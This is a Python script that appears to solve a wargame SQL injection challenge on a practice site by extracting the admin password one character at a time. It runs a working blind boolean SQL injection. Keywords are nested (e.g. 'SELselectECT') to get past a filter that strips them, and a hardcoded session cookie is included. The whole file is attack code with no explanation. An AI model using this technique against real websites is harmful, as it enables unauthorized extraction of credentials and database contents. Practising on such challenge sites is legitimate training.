import requests

def my_request(no):
	url = f"https://p.rubiya.kr/sqli4/?no={no}"
	cookie = {'PHPSESSID':'hrbclhgakts2hofqalha070n75'}
	response = requests.get(url,cookies=cookie)
	return response

def solve():
	cnt = 5
	res = "FLAG{"
	for num in range(0,22-5):
		cnt += 1
		for ch in range(33,255):
			if ch == 43:
				continue
			no = f"9999 || substr((SELselectECT pw FRFROMOM user WHwhereERE id='admin'),{cnt},1) = \""+chr(ch)+"\""
			print(no)
			response = my_request(no)
			if "고개" in response.text:
				res += chr(ch)
				print(res)
				break

	print("I got :",res)

if __name__ == "__main__":
	solve()
